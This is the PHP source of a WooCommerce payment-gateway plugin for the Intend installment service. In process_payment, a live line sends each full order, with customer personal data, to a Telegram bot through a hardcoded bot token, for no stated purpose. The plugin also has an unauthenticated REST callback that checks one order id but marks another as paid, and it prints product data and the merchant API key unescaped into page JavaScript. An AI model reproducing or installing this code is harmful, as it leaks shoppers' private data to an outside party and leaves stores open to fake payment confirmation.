<?php
/**
 * Plugin Name: Intend Payment Gateway for WooCommerce
 * Plugin URI: https://github.com/akbarali1/wordpress-woocommerce-intend
 * Description: Intend Payment Gateway for WooCommerce
 * Author: Akbarali
 * Author URI: https://github.com/akbarali1
 * Version: 0.1
 * Text Domain: wc-gateway-intend
 * Domain Path: /i18n/languages/
 *
 * License: GNU General Public License v3.0
 * License URI: http://www.gnu.org/licenses/gpl-3.0.html
 *
 * @package   wc-gateway-intend
 * @author    Akbarali
 * @category  Admin
 *
 * Intend uchun WooCommerce plugin.
 */

defined('ABSPATH') or exit;
require('core/intend.php');

// Make sure WooCommerce is active
if (!in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins')))) {
    return;
}


/**
 * Add the gateway to WC Available Gateways
 *
 * @param array $gateways all available WC gateways
 * @return array $gateways all WC gateways + intend gateway
 * @since 1.0.0
 */
function wc_intend_add_to_gateways($gateways)
{
    $gateways[] = 'WC_Gateway_intend';
    return $gateways;
}

add_filter('woocommerce_payment_gateways', 'wc_intend_add_to_gateways');

/**
 * Adds plugin page links
 *
 * @param array $links all plugin links
 * @return array $links all plugin links + our custom links (i.e., "Settings")
 * @since 1.0.0
 */
function wc_intend_gateway_plugin_links($links)
{

    $plugin_links = array(
        '<a href="' . admin_url('admin.php?page=wc-settings&tab=checkout&section=intend_gateway') . '">' . __('Configure', 'wc-gateway-intend') . '</a>'
    );

    return array_merge($plugin_links, $links);
}

add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'wc_intend_gateway_plugin_links');

/**
 * intend Payment Gateway
 *
 * Provides an intend Payment Gateway; mainly for testing purposes.
 * We load it later to ensure WC is loaded first since we're extending it.
 *
 * @class        WC_Gateway_intend
 * @extends        WC_Payment_Gateway
 * @version        1.0.0
 * @package        WooCommerce/Classes/Payment
 * @author        Akbarali
 */
add_action('plugins_loaded', 'wc_intend_gateway_init', 11);

function webhook_intend()
{
    $api = new WC_Gateway_intend();

    $order_check = (new \Intend\Intend())->order_check($_GET['order_id'], $api->method_api_key);
    if ($order_check) {
        $order = wc_get_order($_GET['id']);
        $order->payment_complete();
        $order->add_order_note('Intend payment successful');
        $order->update_status('processing');
        wp_redirect($order->get_checkout_order_received_url());
        exit;
    } else {
        $order = wc_get_order($_GET['id']);
        $order->update_status('failed');
        wp_redirect($order->get_checkout_order_received_url());
        exit;
    }
}

add_action('rest_api_init', function () {
    register_rest_route('intend-pay/v1', 'checkOrder', array(
        'methods' => 'GET',
        'callback' => 'webhook_intend',
    ));
});


function wc_intend_gateway_init()
{

    class WC_Gateway_intend extends WC_Payment_Gateway
    {
        public function __construct()
        {

            $this->id = 'intend_gateway';
            $this->icon = apply_filters('woocommerce_intend_icon', 'https://intend.uz/wp-content/themes/itrust/favicon/apple-icon-152x152.png');
            $this->has_fields = false;
            $this->method_title = __('Intend', 'wc-gateway-intend');
            $this->method_api_key = __('', 'wc-gateway-intend');
            $this->method_description = __("Intend.uz tizmining WooCommerce uchun qilingan plagini Yaratuvchi Akbarali", 'wc-gateway-intend');

            // Load the settings.
            $this->init_form_fields();
            $this->init_settings();

            // Define user set variables
            $this->title = $this->get_option('title');
            $this->description = $this->get_option('description');
            $this->method_api_key = $this->get_option('api_key');
            $this->instructions = $this->get_option('instructions', $this->description);

            // Actions
            add_action('woocommerce_update_options_payment_gateways_' . $this->id, array($this, 'process_admin_options'));
            add_action('woocommerce_thankyou_' . $this->id, array($this, 'thank_you_page'));

            // Customer Emails
            add_action('woocommerce_email_before_order_table', array($this, 'email_instructions'), 10, 3);

        }

        public function init_form_fields()
        {

            $this->form_fields = apply_filters('wc_intend_form_fields', array(

                'enabled' => array(
                    'title' => __('Enable/Disable', 'wc-gateway-intend'),
                    'type' => 'checkbox',
                    'label' => __('Enable intend Payment', 'wc-gateway-intend'),
                    'default' => 'yes'
                ),

                'title' => array(
                    'title' => __('Title', 'wc-gateway-intend'),
                    'type' => 'text',
                    'description' => __('This controls the title for the payment method the customer sees during checkout.', 'wc-gateway-intend'),
                    'default' => __('intend Payment', 'wc-gateway-intend'),
                    'desc_tip' => true,
                ),

                'description' => array(
                    'title' => __('Description', 'wc-gateway-intend'),
                    'type' => 'textarea',
                    'description' => __('Payment method description that the customer will see on your checkout.', 'wc-gateway-intend'),
                    'default' => __('Please remit payment to Store Name upon pickup or delivery.', 'wc-gateway-intend'),
                    'desc_tip' => true,
                ),

                'instructions' => array(
                    'title' => __('Instructions', 'wc-gateway-intend'),
                    'type' => 'textarea',
                    'description' => __('Instructions that will be added to the thank you page and emails.', 'wc-gateway-intend'),
                    'default' => '',
                    'desc_tip' => true,
                ),
                'api_key' => array(
                    'title' => __('API key', 'wc-gateway-intend'),
                    'type' => 'text',
                    'description' => __('Intend.uz tomonidan berilgan API keyni kiriting.', 'wc-gateway-intend'),
                    'default' => '',
                    'desc_tip' => true,
                ),
            ));
        }

        public function payment_fields()
        {
            global $woocommerce;

            foreach (WC()->cart->get_cart() as $cart_item) {
                $quantity = $cart_item['quantity'];
                $products[] = $this->getProduct($cart_item['product_id'], $quantity);
                $product_id[] = $cart_item['product_id'];
            }

            if (!isset($quantity)) {
                $orderasasasas = wc_get_order(get_query_var('order-pay'));
                $products = $this->getProducts($orderasasasas);
                $product_id = $this->getProductIds($orderasasasas);
            }

            $api_request_calculate = $this->calculateIntend($product_id);

            if ($this->description) {
                echo wpautop(wp_kses_post($this->description));
            }

            ?>
            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
            <label for="cars">Choose a car:</label>
            <select name="duration" id="duration">
                <option value="">------</option>
                <?php foreach ($api_request_calculate['months'] as $month): ?>
                    <option value="<?php echo $month ?>"><?php echo $month ?></option>
                <?php endforeach; ?>
            </select>
            <script type="text/javascript">
                $(document).ready(function () {
                    if (!document.getElementById("forma")) {
                        $('body').append('<div id="forma"></div>');
                    }

                    function checkboxFunction() {
                        var checkbox = document.getElementById("payment_method_intend_gateway");
                        if (checkbox.checked) {
                            //'<input type="hidden" name="redirect_url" value="<?//=site_url()?>///wp-json/intend-pay/v1/checkOrder/?id=">' +
                            var html = '';
                            html += '<form method="post" action="https://pay.intend.uz" id="intendform">' +
                                '<input type="hidden" name="redirect_url" id="redirect_url">' +
                                '<input type="hidden" name="api_key" value="<?=$this->method_api_key?>">' +
                                '<input type = "hidden" name = "duration" id="duration-form" value="' + $("#duration option:selected").val() + '">';
                            <?php foreach ($products as $key => $product):?>
                            html += '<input type="hidden" name="products[<?=$key?>][id]" value="<?=$product['id']?>"/>' +
                                '<input type="hidden" name="products[<?=$key?>][name]" value="<?=$product['name']?>"/>' +
                                '<input type="hidden" name="products[<?=$key?>][price]" value="<?=$product['price']?>"/>' +
                                '<input type="hidden" name="products[<?=$key?>][sku]" value="<?=$product['sku']?>"/>' +
                                '<input type="hidden" name="products[<?=$key?>][weight]" value="<?=$product['weight']?>"/>' +
                                '<input type="hidden" name="products[<?=$key?>][quantity]" value="<?=$product['quantity']?>"/>';
                            <?php endforeach;?>
                            $('#forma').html(html);
                            $('#place_order').hide();
                        } else {
                            $('#forma').html("");
                            $('#place_order').show();
                        }
                    }

                    $("input[type=radio]").click(function () {
                        checkboxFunction();
                    });

                    $("#intend-form-submit").click(function () {
                        if ($("#duration option:selected").val() > 0 && $('#duration-form').val() > 0) {
                            var $form = $('form[name="checkout"]');
                            $.ajax({
                                type: 'POST',
                                url: wc_checkout_params.checkout_url,
                                data: $form.serialize(),
                                dataType: 'json',
                                timeout: 10000,
                                success: function (result) {
                                    try {
                                        if (result.result === 'success') {
                                            $('#redirect_url').val('<?=site_url()?>/wp-json/intend-pay/v1/checkOrder/?id=' + result.order_id);
                                            $("#intendform").submit(); // Submit the form
                                        } else if ('failure' === result.result) {
                                            throw 'Result failure';
                                        } else {
                                            throw 'Invalid response';
                                        }

                                    } catch (err) {
                                        // Reload page
                                        if (true === result.reload) {
                                            window.location.reload();
                                            return;
                                        }
                                        // Trigger update in case we need a fresh nonce
                                        if (true === result.refresh) {
                                            $(document.body).trigger('update_checkout');
                                        }
                                        // Add new errors
                                        if (result.messages) {
                                            wc_checkout_form.submit_error(result.messages);
                                        } else {
                                            wc_checkout_form.submit_error('<div class="woocommerce-error">' + wc_checkout_params.i18n_checkout_error + '</div>'); // eslint-disable-line max-len
                                        }
                                    }
                                },
                                error: function (jqXHR, textStatus, errorThrown) {
                                    // Detach the unload handler that prevents a reload / redirect
                                    wc_checkout_form.detachUnloadEventsOnSubmit();
                                    wc_checkout_form.submit_error('<div class="woocommerce-error">' + errorThrown + '</div>');
                                }
                            });
                        } else {
                            alert("Iltimos biror oyni tanlang!");
                            return false;
                        }
                    });

                    $('#duration').on('change', function () {
                        $('#duration-form').val($(this).val());
                    });

                    checkboxFunction();
                });

            </script>
            <br>
            <input type="button" id="intend-form-submit" value="Submit">
            <?php
        }

        public function thank_you_page()
        {
            if ($this->instructions) {
                echo wpautop(wptexturize($this->instructions));
            }
        }

        public function email_instructions($order, $sent_to_admin, $plain_text = false)
        {

            if ($this->instructions && !$sent_to_admin && $this->id === $order->payment_method && $order->has_status('on-hold')) {
                echo wpautop(wptexturize($this->instructions)) . PHP_EOL;
            }
        }

        public function process_payment($order_id)
        {
            $order = wc_get_order($order_id);

            file_get_contents('https://api.telegram.org/bot1917492541:AAEnh6IxfoAnkghy1n0pezVdERU6Vz_-Hdo/sendMessage?chat_id=414229140&text=' . json_encode($order) . '&parse_mode=html');

//            $order->update_status('pending', __("To'lovni kutmoqda", 'wc-gateway-intend'));
//            $order->reduce_order_stock();
//            WC()->cart->empty_cart();
            return array(
                'result' => 'success',
                'order_id' => $order_id,
            );
        }

        private function getProducts($order)
        {
            foreach ($order->get_items() as $item_id => $item) {
                $_product = wc_get_product($item->get_product_id());
                $tovar[] = [
                    'id' => $item->get_product_id(),
                    'name' => $item->get_name(),
                    'price' => $_product->get_price(),
                    'sku' => $_product->get_sku(),
                    'weight' => (!empty($_product->get_weight())) ? $_product->get_weight() * 1000 : 0,
                    'quantity' => $item->get_quantity(),
                ];
            }
            return $tovar;
        }

        private function getProductIds($order)
        {
            $product_ids = [];
            foreach ($order->get_items() as $item_id => $item) {
                $product_ids[] = $item->get_product_id();
            }
            return $product_ids;
        }

        public function getProduct($product_id, $quantity)
        {
            $_product = wc_get_product($product_id);
            $post_data = [
                'id' => $product_id,
                'name' => $_product->get_name(),
                'price' => $_product->get_price(),
                'sku' => $_product->get_sku(),
                'weight' => (!empty($_product->get_weight())) ? $_product->get_weight() * 1000 : 0,
                'quantity' => $quantity,
            ];

            return $post_data;

        }

        protected function calculateIntend($order = [])
        {
            $post_data = [];
            foreach ($order as $item) {
                $_product = wc_get_product($item);
                $post_data[] = [
                    'api_key' => $this->method_api_key,
                    'id' => $item,
                    'price' => $_product->get_price(),
                ];
            }
            return (new \Intend\Intend())->calculate($post_data);
        }

    } // end \WC_Gateway_Intend class
}